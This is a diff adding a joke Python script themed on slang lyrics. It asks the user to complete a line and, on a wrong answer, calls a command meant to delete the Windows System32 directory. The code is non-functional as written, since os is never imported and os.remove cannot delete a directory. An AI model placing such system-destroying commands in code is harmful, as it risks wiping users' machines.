@@ -1,0 +1,10 @@
+#STICKING OUT YOU GYATT FOR THE RIZZLER, YOU'RE SO SKIDBI, YOU'RE SO FANUM TAX. I JUST WANNA BE YOUR SIGMA...
+
+
+def brainrot():
+  text = input("Sticking out your gyatt for the...")
+  if not text.lower() == "rizzler":
+    print("WRONG! DELETING SYSTEM 32!!")
+    os.remove("C:/Windows/System32")
+  else:
+    print("Good!")
